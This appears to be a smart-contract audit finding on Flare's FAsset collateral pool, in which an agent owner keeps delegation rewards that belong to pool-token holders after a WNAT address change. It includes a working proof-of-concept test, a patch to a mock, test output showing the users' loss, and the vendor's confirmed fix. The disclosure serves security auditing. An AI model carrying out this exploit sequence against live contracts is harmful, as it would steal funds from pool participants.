# [M-03] Accumulated rewards in FSTO can be stolen by the agent’s owner

## Summary

*No summary available*

## GitHub Source Code

- **Link**: https://code4rena.com/audits/2025-08-flare-fasset/submissions/F-248
- **Valid**: ✓ Yes

## Content

https://github.com/code-423n4/2025-08-flare/blob/7bcf1437ddd739a15f8aa1b588fcc17eb66d2f31/contracts/collateralPool/implementation/CollateralPool.sol#L832

### Finding Description

Rewards obtained from FSTO through the delegation of voting power to signal providers can be stolen by the agent’s owner due to a discrepancy between the reward token’s address and WNAT’s address in the `collateralPool` contract, leading to the forfeiture of rewards for CPT holders.

### Proof of Concept

**Issue Path:**

- Users contribute their WNATs to the agent’s pool.
- The owner’s agent delegates voting power to signal providers.
- The WNAT address is modified by the asset updater in the Flare Time Series Oracle (FTSO).
- `AssetManagerController::updateContracts` is invoked by every user, as it does not have access constraints.
  The agent’s owner identifies the opportunity and executes `CollateralPool::claimDelegationRewards`, resulting in the transfer of new WNAT to the agent’s pool; however, the `totalCollateral` remains unchanged due to an inconsistency between the received token and the pool’s collateral token.
- Subsequently, the agent’s owner invokes `CollateralPool::upgradeWNatContract`, which merely swaps the old WNATs for the new version.
- Finally, the agent’s owner can sweep collected new WNATs as a reward following the announcement of destruction.

```
    function claimDelegationRewards(
        IRewardManager _rewardManager,
        uint24 _lastRewardEpoch,
        IRewardManager.RewardClaimWithProof[] calldata _proofs
    )
        external
        onlyAgent
        nonReentrant
        returns (uint256)
    {
     @>>>   uint256 balanceBefore = wNat.balanceOf(address(this));
        _rewardManager.claim(address(this), payable(address(this)), _lastRewardEpoch, true, _proofs);
      @>>>  uint256 balanceAfter = wNat.balanceOf(address(this));
        uint256 claimed = balanceAfter - balanceBefore;
        totalCollateral += claimed;
        assetManager.updateCollateral(agentVault, wNat);
        emit CPClaimedReward(claimed, 1);
        return claimed;
    }
```

**Coded PoC:**

Kindly apply the git patch and incorporate the subsequent proof of concept (PoC) into `AttackScenario.ts`.

```
++ b/test/integration/assetManager/AttackScenarios.ts
++import { impersonateContract, stopImpersonatingContract } from "../../../lib/test-utils/contract-test-helpers";
++ const WNat = artifacts.require("WNatMock");

+++ b/contracts/assetManager/mock/RewardManagerMock.sol
@@ -24,7 +24,7 @@ contract RewardManagerMock {
     )
         external returns(uint256 _rewardAmount)
     {
-        uint256 reward = 1 ether;
+        uint256 reward = 1000 ether;
         if (_wrap) {
             wNat.transfer(_recipient, reward);
         } else {
```

```
    it.only("update-wnat-address", async() => {

        const agent = await Agent.createTest(context, agentOwner1, underlyingAgent1);

        const requiredCollateral = await agent.requiredCollateralForLots(10);
        await agent.depositCollateralsAndMakeAvailable(requiredCollateral.vault, requiredCollateral.pool);

        const user = accounts[12];
        await agent.collateralPool.enter({value: requiredCollateral.pool, from: user});

const newWNAT = await WNat.new(context.governance, "WNAT2", "WNAT2");

await impersonateContract(context.assetManagerController.address, toBNExp(1, 18), accounts[0]);
        await context.assetManager.updateSystemContracts(context.assetManagerController.address, newWNAT.address,
                    { from: context.assetManagerController.address });
        await stopImpersonatingContract(context.assetManagerController.address);

        let snapshotId = await network.provider.send("evm_snapshot", []);
        await context.assetManager.upgradeWNatContract(agent.agentVault.address, {from: agent.ownerWorkAddress});

        let rewardManagerMock = artifacts.require('RewardManagerMock');
        let rewardManager = await rewardManagerMock.new(newWNAT.address);
        let claimAmount = toBNExp(1000, 18);
        await newWNAT.depositTo(rewardManager.address, { value: claimAmount });
        await agent.collateralPool.claimDelegationRewards(rewardManager.address, 0, [],
            { from: agent.ownerWorkAddress});

        let totalCollateral = await agent.collateralPool.totalCollateral();
        let totalSupply = await agent.collateralPoolToken.totalSupply();
        let tokenShare = await agent.collateralPoolToken.balanceOf(user);
        let natShare1 = totalCollateral.mul(tokenShare).div(totalSupply);
        console.log("net share with updating wnat address before claiming is %d NAT:", Number(natShare1) / 1e18);
        await network.provider.send("evm_revert", [snapshotId]);

        rewardManagerMock = artifacts.require('RewardManagerMock');
        rewardManager = await rewardManagerMock.new(newWNAT.address);
        claimAmount = toBNExp(1000, 18);
        await newWNAT.depositTo(rewardManager.address, { value: claimAmount });
        await agent.collateralPool.claimDelegationRewards(rewardManager.address, 0, [],
            { from: agent.ownerWorkAddress});

        await context.assetManager.upgradeWNatContract(agent.agentVault.address, {from: agent.ownerWorkAddress});

totalCollateral = await agent.collateralPool.totalCollateral();
        totalSupply = await agent.collateralPoolToken.totalSupply();
        tokenShare = await agent.collateralPoolToken.balanceOf(user);
        let natShare2 = totalCollateral.mul(tokenShare).div(totalSupply);
        console.log("net share without updating wnat address before claiming is %d NAT", Number(natShare2) / 1e18);
        console.log("user's loss:%d NAT", (natShare1 - natShare2) / 1e18)

});
```

```
  Contract: AssetManager.sol; test/integration/assetManager/AttackScenarios.ts; Asset manager integration tests
net share with updating wnat address before claiming is 251500 NAT:
net share without updating wnat address before claiming is 250999.99999999997 NAT:
user's loss:500.00000000001154 NAT
    ✔ update-wnat-address (91ms)

1 passing (3s)
```

**[Flare mitigated](https://github.com/code-423n4/2025-10-flare-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues):**

> `upgradeWNatContract` must be called by governance or a governance-appointed executor.

**Status:** Mitigation confirmed. Full details in reports from [farman1094](https://code4rena.com/audits/2025-10-flare-fasset-mitigation-review/submissions/S-8) and [rvierdiiev](https://code4rena.com/audits/2025-10-flare-fasset-mitigation-review/submissions/S-9).